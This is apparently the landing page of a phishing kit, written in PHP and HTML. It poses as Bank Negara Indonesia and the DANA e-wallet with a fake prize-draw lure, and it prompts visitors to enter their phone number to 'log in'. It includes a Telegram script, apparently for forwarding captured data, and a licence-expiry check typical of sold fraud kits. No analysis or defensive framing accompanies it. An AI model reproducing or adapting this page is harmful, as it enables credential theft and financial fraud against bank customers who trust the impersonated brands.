<?php
define('SECURE_ACCESS', true);
include 'req/telegram.php';
$expiryDate = $exp; // YYYY-MM-DD format

// Dapatkan tanggal saat ini
$currentDate = date('Y-m-d');

if ($currentDate > $expiryDate) {
    header('Location: expired.html');
    exit();
}
?>
<html>
<head>
    <meta name="theme-color" content="#ff8736"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
   
	<meta property="og:title" content="PT. Bank Negara Indonesia (Persero) Tbk."> 
	<meta property="og:description" content="Jl. Daan Mogot No.234 5, RT.4/RW.5, Duri Kepa, Kec. Kb. Jeruk, Kota Jakarta Barat, Daerah Khusus Ibukota Jakarta 11510
Peta bni kcu daan mogot
">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>𝐀𝐦𝐛𝐢𝐥 𝐇𝐚𝐝𝐢𝐚𝐡𝐌U 𝐒𝐞𝐤𝐚𝐫𝐚𝐧𝐠</title>
<meta property="og:title" content= "𝐀𝐦𝐛𝐢𝐥 𝐇𝐚𝐝𝐢𝐚𝐡𝐌𝐔 𝐒𝐞𝐤𝐚𝐫𝐚𝐧𝐠">
<meta property="twitter:title" content="𝑭𝒆𝒔𝒕𝒊𝒗𝒂𝒍 𝑮𝒆𝒃𝒚𝒂𝒓 𝑼𝒏𝒅𝒊𝒂𝒏 𝑩𝑵𝑰">
<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKJ7Nq7f0WZVtx7Gi2Lv5x5_OzW6gzD9SQ8HgL9BEFwyusBAgfVKx4prPOHTQ9zMkvpI1khTbVuFVi2uTV5pVA9slc6Sl-AAARsPZnOz5iK3DnzVDA828HVd0fsd-M1boriWUj0IUbEsuyONRXzCcGHXinFWMzT_lctiYyaZXdHePFn7R2AGzQMboC9Dw/s554/images.jpeg" property="og:image">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
 <link href="../blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKJ7Nq7f0WZVtx7Gi2Lv5x5_OzW6gzD9SQ8HgL9BE/s554/images.jpeg" rel="icon" type="image/x-icon">
    <link href="../blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKJ7Nq7f0WZVtx7Gi2Lv5x5_OzW6gzD9SQ8HgL9BE/s554/images.jpeg" rel="apple-touch-icon">
<meta http-equiv="X-UA-Compatible" content="ie=edge">


<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKJ7Nq7f0WZVtx7Gi2Lv5x5_OzW6gzD9SQ8HgL9BEFwyusBAgfVKx4prPOHTQ9zMkvpI1khTbVuFVi2uTV5pVA9slc6Sl-AAARsPZnOz5iK3DnzVDA828HVd0fsd-M1boriWUj0IUbEsuyONRXzCcGHXinFWMzT_lctiYyaZXdHePFn7R2AGzQMboC9Dw/s554/images.jpeg" property="og:image">

    
    <!-- Demo styles -->
    <style>
      html,
      body {
        position: relative;
        height: 100%;
		overflow: hidden; 
        background-color: #ffff00;
        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 14px;
        color: #000;
        margin: 0;
        padding: 0;
      }

	</style>
</head>
<body style="background-color: #fff000;">
    <div style="display:none;" class="index">
        <div class="header">
            
        </div>
        <div class="content">
            <div class="hero">
                
            </div>
            <h1>Dompet digital untuk kamu!</h1>
            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
            <div class="line">
            </div>
            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
            <button type="button" onclick="next();">LOGIN</button>
        </div>
    </div>
    <div class="start" style="display:none; background-color: #ffff99;">
        
    </div>
    <div class="container hid">
        <div class="box-login" style="background-color: #ffff88;">
            <div id="process" name="process" class="process" style="display: none;">
                <div class="loading">
                    
                </div>
            </div>
            <div class="header11">
                <a href="one.php"><img src="img/tm.png" style="width: 100%; left: 0px; top: 0px; border-radius: 0px 0px 80px 0px; border-bottom: 5px solid #FF8601; height: 100%">
                </a>
            </div>
            

</body>
</html>
